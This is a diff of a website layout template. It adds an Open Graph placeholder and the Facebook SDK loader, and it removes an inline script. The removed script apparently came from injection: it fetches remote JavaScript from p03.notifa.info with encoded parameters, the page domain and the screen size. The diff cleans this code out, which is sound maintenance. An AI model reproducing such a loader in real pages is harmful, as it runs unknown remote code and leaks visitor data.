@@ -9,6 +9,8 @@
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
+	@yield('open-grap')
+
 	<link href='http://fonts.googleapis.com/css?family=Lato:300,400,700,900,400italic' rel='stylesheet' type='text/css'>
 	<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
 	
@@ -29,6 +31,16 @@
 
 </head>
 <body>
+
+	<div id="fb-root"></div>
+	<script>(function(d, s, id) {
+		var js, fjs = d.getElementsByTagName(s)[0];
+		if (d.getElementById(id)) return;
+		js = d.createElement(s); js.id = id;
+		js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.5&appId=526419284127691";
+		fjs.parentNode.insertBefore(js, fjs);
+	}(document, 'script', 'facebook-jssdk'));
+	</script>
 
 	@include('website._layouts.header')
 
@@ -57,15 +69,6 @@
     <script type="text/javascript" src="{{asset('plugins/lazy/jquery.lazy.min.js')}}"></script>
 
 	<script type="text/javascript">
-		if (self==top) {
-			function netbro_cache_analytics(fn, callback) {
-				setTimeout(function() {
-					fn();
-					callback();
-					}, 0);
-				}
-			function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprA5wClD%2fduy4o2%2byvdJEQXEGOBOCTOdO4dcDeskZjLEtDLInVM%2f4hHTdqkAh687bNai50EFkcigwycO5HTNCrbu7XsqKajYQjyulFvkhaKKKX%2flZJpe1B7ZWoLOohTrqFXm1IzfAFdx%2fBA%2bAtIT%2fKwXDYcOFxk2xCrJz5%2b8SLGTkCQYRooPS%2bYaPZxXM10Su%2bJFo800HuvEAz5dNtxLtXfKlYBTdLH9Sw2hiZrQeeG%2bTVZcak3oy83QJOjdyUSaKC16vw41lmmNv6V4DfiN%2b%2bKfsKTfzJlyKrcAZ4pjELccdZJIGjzcv1M26PmJ7OngBNHmfwY2wWr5s280gBiJcMvOEYvlcfn4nCv1%2fVH5IdeVRf8dGHTarh0%2bBcTGO9knSp5ZRtZAYSvnoVllTTwlsKiylH8zeupUAqdHfRgELoPQmatcmHpZMtx6uBtr6F%2fd53f1SRwYjkDyCGRTjKBtwvEIkVzfoZYZ3A7uRr096lrfdVk8nx0RcSkqQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
-		
 
 			$(function() {
 				jQuery("img.lazy").lazy({
